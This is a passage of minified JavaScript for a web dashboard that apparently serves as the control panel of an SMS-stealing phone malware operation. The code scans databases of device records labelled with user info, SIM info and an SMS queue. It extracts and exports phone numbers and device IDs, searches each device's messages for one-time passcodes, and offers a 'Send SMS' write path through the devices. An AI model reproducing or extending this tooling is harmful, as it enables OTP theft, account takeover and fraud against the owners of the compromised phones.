                    <option value="6">Type 6 · All_User Info+SimINFO</option>
                    <option value="7">Type 7 · All_Users DeviceInfo</option>
                    <option value="8">Type 8 · All_User Data+Commands</option>
                    <option value="9">Type 9 · All_User Info + root smsQueue</option>
                </select>
            </div>
            <p class="text-[9px] font-mono text-slate-600 leading-relaxed">
                Forcing a type changes how records are read and which write path Send SMS uses. Types 4–8 have no write path and fall back to Type 1.
            </p>
        </div>`,
    baseInfo = `
        <div class="bg-slate-900/40 border border-slate-800 rounded-xl p-3 space-y-2">
            <div class="flex items-center justify-between">
                <div class="text-[10px] font-mono font-bold text-cyan-400 uppercase tracking-wider">Active Base</div>
                <span id="baseSourceBadge" class="text-[9px] font-mono text-slate-500">${discoveredBases.length} base(s)</span>
            </div>
            <div class="flex items-center gap-2">
                <select id="baseSelectorInline" class="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-2 py-1.5 text-[11px] font-mono text-slate-200 outline-none focus:border-cyan-500/50"></select>
                <button id="refreshBasesBtn" class="btn-secondary text-[10px] py-1.5 px-2.5 flex items-center gap-1">
                    <span class="material-icons text-xs">refresh</span><span>Bases</span>
                </button>
            </div>
            <div class="flex items-center gap-2">
                <input id="manualBaseInput" type="text" placeholder="csc5 or 5 (numeric path)" class="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-2 py-1.5 text-[11px] font-mono text-slate-200 placeholder-slate-600 outline-none focus:border-cyan-500/50">
                <button id="applyBaseBtn" class="btn-secondary text-[10px] py-1.5 px-2.5">Apply</button>
            </div>
            <p class="text-[9px] font-mono text-slate-600 leading-relaxed">
                Numeric paths are accepted wherever <span class="text-slate-400">cscN</span> is expected — a database that stores its data under <span class="text-cyan-500">/5</span> instead of <span class="text-cyan-500">/csc5</span> works the same way.
            </p>
        </div>`,
    schemeCards = SCHEME_ORDER.map((sid) => {
      const s = SCHEMES[sid],
        hits = schemeResults.filter((r) => r.scheme === sid).length;
      return `
            <label class="flex items-start gap-2 bg-slate-900/40 border border-slate-800 rounded-xl p-2.5 cursor-pointer hover:border-cyan-500/30 transition">
                <input type="checkbox" class="scheme-toggle mt-0.5 accent-cyan-500" data-scheme="${sid}" checked>
                <div class="flex-1 min-w-0">
                    <div class="flex items-center gap-1.5 flex-wrap">${schemeBadge(sid)}</div>
                    <div class="text-[9px] text-slate-500 font-mono mt-1 leading-relaxed">${s.desc}</div>
                    <div class="text-[9px] font-mono mt-1 ${hits ? "text-emerald-400" : "text-slate-600"}">${hits} phone(s)</div>
                </div>
            </label>`;
    }).join(""),
    rows = schemeResults.length
      ? schemeResults
          .map(
            (r) => `
        <tr class="hover:bg-slate-900/40 transition">
            <td class="p-2 text-emerald-400 font-bold select-all">${r.phone}</td>
            <td class="p-2 text-slate-300 select-all">${r.did}</td>
            <td class="p-2 text-slate-500 select-all">${r.client_id}</td>
            <td class="p-2 text-cyan-400">${baseLabel(r.base_path)}</td>
            <td class="p-2">${schemeBadge(r.scheme)}</td>
            <td class="p-2 text-slate-500">${r.source}</td>
        </tr>`,
          )
          .join("")
      : `
        <tr><td colspan="6" class="p-4 text-center text-slate-600 text-xs">No phones extracted yet — pick a base and run a scan.</td></tr>`,
    logRows = schemeLog.length
      ? schemeLog
          .map(
            (l) => `
        <div class="flex items-center justify-between text-[9px] font-mono py-0.5 border-b border-slate-900/60">
            <span class="text-slate-500">${baseLabel(l.base)} · ${l.scheme}</span>
            <span class="${l.error ? "text-rose-400" : l.count ? "text-emerald-400" : "text-slate-600"}">${l.error ? "error" : l.count + " found"}</span>
        </div>`,
          )
          .join("")
      : '<div class="text-[9px] font-mono text-slate-600 py-1">No scan run yet.</div>';
  ((container.innerHTML = `
        ${dbCard}
        ${schemaCard}
        ${baseInfo}
        <div class="bg-slate-900/40 border border-slate-800 rounded-xl p-3 space-y-2">
            <div class="flex items-center justify-between">
                <div class="text-[10px] font-mono font-bold text-cyan-400 uppercase tracking-wider">Schemes</div>
                <div class="flex gap-1.5">
                    <button id="selectAllSchemesBtn" class="btn-secondary text-[9px] py-1 px-2">All</button>
                    <button id="selectNoSchemesBtn" class="btn-secondary text-[9px] py-1 px-2">None</button>
                </div>
            </div>
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">${schemeCards}</div>
            <div class="flex gap-2 pt-1">
                <button id="runSchemeScanBtn" class="flex-1 bg-cyan-500/10 hover:bg-cyan-500/20 border border-cyan-500/30 text-cyan-400 font-bold text-[10px] font-mono rounded-xl px-3 py-2.5 transition flex items-center justify-center gap-1.5">
                    <span class="material-icons text-sm">radar</span><span>Scan All Bases</span>
                </button>
                <button id="runSchemeScanCurrentBtn" class="btn-secondary text-[10px] py-2.5 px-3">This Base</button>
            </div>
            <div id="schemeScanStatus" class="text-[9px] font-mono text-center" style="color:${schemeStatusColor}">${schemeStatusText}</div>
        </div>

        <div class="bg-slate-900/40 border border-slate-800 rounded-xl p-3">
            <div class="flex items-center justify-between mb-2">
                <div class="text-[10px] font-mono font-bold text-cyan-400 uppercase tracking-wider">Extracted Phones</div>
                <div class="flex items-center gap-1.5">
                    <span class="text-[9px] font-mono text-slate-500">${schemeResults.length} total</span>
                    <button id="exportSchemeResultsBtn" class="btn-secondary text-[9px] py-1 px-2">Export</button>
                </div>
            </div>
            <div class="table-frame">
                <table class="w-full text-left border-collapse text-[10px] font-mono">
                    <thead><tr class="table-header">
                        <th class="p-2">Phone</th><th class="p-2">DID</th><th class="p-2">Client</th>
                        <th class="p-2">Base</th><th class="p-2">Scheme</th><th class="p-2">Source</th>
                    </tr></thead>
                    <tbody class="divide-y divide-slate-900 text-slate-300">${rows}</tbody>
                </table>
            </div>
        </div>

        <div class="bg-slate-900/40 border border-slate-800 rounded-xl p-3">
            <div class="text-[10px] font-mono font-bold text-cyan-400 uppercase tracking-wider mb-1.5">Scan Log</div>
            ${logRows}
        </div>`),
    renderBaseSelector());
  const dbSelInline = $("dbQuickSelectInline");
  dbSelInline &&
    ((dbSelInline.innerHTML = savedDatabases
      .map(
        (d) =>
          `<option value="${d.url}"${d.url === activeDatabaseUrl ? " selected" : ""}>${d.label || dbShortName(d.url)}</option>`,
      )
      .join("")),
    dbSelInline.addEventListener("change", async (e) => {
      (await switchDatabase(e.target.value), renderDatabaseManager());
    }));
  const dbMgrInline = $("openDbManagerBtnInline");
  dbMgrInline && dbMgrInline.addEventListener("click", openDatabaseManager);
  const schemaSel = $("schemaOverrideSelect");
  schemaSel &&
    ((schemaSel.value = schemaIsManual() ? String(schemaOverride) : "auto"),
    schemaSel.addEventListener("change", (e) =>
      setSchemaOverride(e.target.value),
    ));
  const sel = $("baseSelectorInline");
  sel && sel.addEventListener("change", (e) => switchBase(e.target.value));
  const refreshBtn = $("refreshBasesBtn");
  refreshBtn &&
    refreshBtn.addEventListener("click", async () => {
      ((refreshBtn.disabled = !0),
        await refreshBases(),
        (refreshBtn.disabled = !1),
        toast("Base list refreshed", "success"));
    });
  const applyBtn = $("applyBaseBtn");
  applyBtn &&
    applyBtn.addEventListener("click", () => {
      const v = ($("manualBaseInput").value || "").trim();
      if (!v) {
        toast("Enter a base path", "error");
        return;
      }
      if (!isBaseKey(v.replace(/^\/+/, ""))) {
        toast("Base must be cscN or a number", "error");
        return;
      }
      switchBase(v);
    });
  const allBtn = $("selectAllSchemesBtn");
  allBtn &&
    allBtn.addEventListener("click", () => {
      document
        .querySelectorAll(".scheme-toggle")
        .forEach((c) => (c.checked = !0));
    });
  const noneBtn = $("selectNoSchemesBtn");
  noneBtn &&
    noneBtn.addEventListener("click", () => {
      document
        .querySelectorAll(".scheme-toggle")
        .forEach((c) => (c.checked = !1));
    });
  const runAll = $("runSchemeScanBtn");
  runAll && runAll.addEventListener("click", () => runSchemeScan(!0));
  const runCur = $("runSchemeScanCurrentBtn");
  runCur && runCur.addEventListener("click", () => runSchemeScan(!1));
  const expBtn = $("exportSchemeResultsBtn");
  expBtn && expBtn.addEventListener("click", exportSchemeResults);
}
function selectedSchemes() {
  const picked = Array.from(document.querySelectorAll(".scheme-toggle"))
    .filter((b) => b.checked)
    .map((b) => b.getAttribute("data-scheme"));
  return picked.length ? picked : SCHEME_ORDER.slice();
}
async function runSchemeScan(allBases) {
  if (isSchemeScanning) return;
  isSchemeScanning = !0;
  const status = $("schemeScanStatus"),
    btn = $("runSchemeScanBtn");
  (btn && (btn.disabled = !0),
    (schemeStatusText = "Scanning…"),
    (schemeStatusColor = "#64748b"),
    status &&
      ((status.textContent = schemeStatusText),
      (status.style.color = schemeStatusColor)));
  try {
    const schemes = selectedSchemes(),
      bad = loadBadNumbers(),
      bases = allBases ? discoveredBases : [activeBase],
      res = await scanAll(db, { bases, schemes, badNumbers: bad });
    ((schemeResults = res.clients),
      (schemeLog = res.log),
      (schemeStatusText = `${schemeResults.length} phone(s) across ${bases.length} base(s)`),
      (schemeStatusColor = schemeResults.length ? "#34d399" : "#64748b"),
      toast(
        `${schemeResults.length} phone(s) extracted`,
        schemeResults.length ? "success" : "info",
      ),
      renderSchemesView());
  } catch (e) {
    ((schemeStatusText = "Scan failed: " + e.message),
      (schemeStatusColor = "#fb7185"),
      toast("Scan failed: " + e.message, "error"),
      renderSchemesView());
  } finally {
    isSchemeScanning = !1;
    const b = $("runSchemeScanBtn");
    b && (b.disabled = !1);
  }
}
function exportSchemeResults() {
  if (!schemeResults.length) {
    toast("Nothing to export", "error");
    return;
  }
  const payload = {
      exported_at: new Date().toISOString(),
      active_base: activeBase,
      bases: discoveredBases,
      schemes: SCHEME_ORDER,
      count: schemeResults.length,
      clients: schemeResults,
    },
    blob = new Blob([JSON.stringify(payload, null, 2)], {
      type: "application/json",
    }),
    a = document.createElement("a");
  ((a.href = URL.createObjectURL(blob)),
    (a.download = `scheme_scan_${Date.now()}.json`),
    a.click(),
    URL.revokeObjectURL(a.href),
    toast("Scheme results exported", "success"));
}
((window.lookupOtp = function (deviceId, sinceMs) {
  const devMsgs = messagesData && messagesData[deviceId];
  if (!devMsgs) return null;
  const otp = findOtpInMsgs(devMsgs, sinceMs || 0);
  return (
    otp
      ? toast(`OTP for ${deviceId}: ${otp}`, "success")
      : toast(`No OTP found for ${deviceId}`, "info"),
    otp
  );
}),
  (async function () {
    (loadSchemaOverride(), loadDatabases(), renderDatabaseBar());
    const headerSel = $("baseSelector");
    headerSel &&
      headerSel.addEventListener("change", (e) => switchBase(e.target.value));
    const dbBtn = $("openDbManagerBtn");
    dbBtn && dbBtn.addEventListener("click", openDatabaseManager);
    const dbClose = $("closeDbManagerBtn");
    dbClose && dbClose.addEventListener("click", closeDatabaseManager);
    const dbBackdrop = $("dbManagerBackdrop");
    dbBackdrop && dbBackdrop.addEventListener("click", closeDatabaseManager);
    const dbAdd = $("dbAddBtn");
    dbAdd && dbAdd.addEventListener("click", submitNewDatabase);
    const dbUrlIn = $("dbUrlInput");
    dbUrlIn &&
      dbUrlIn.addEventListener("keydown", (e) => {
        e.key === "Enter" && (e.preventDefault(), submitNewDatabase());
      });
    const dbQuick = $("dbQuickSelect");
    (dbQuick &&
      dbQuick.addEventListener("change", async (e) => {
        (await switchDatabase(e.target.value), renderDatabaseManager());
      }),
      document.addEventListener("keydown", (e) => {
        e.key === "Escape" && closeDatabaseManager();
      }),
      await refreshBases(),
      await autoSelectBaseIfEmpty(),
      subscribeAll(),
      (loadAutoRefreshPref(),
      renderAutoRefreshUi(),
      startAutoRefresh(),
      renderActiveTabContent()));
  })());
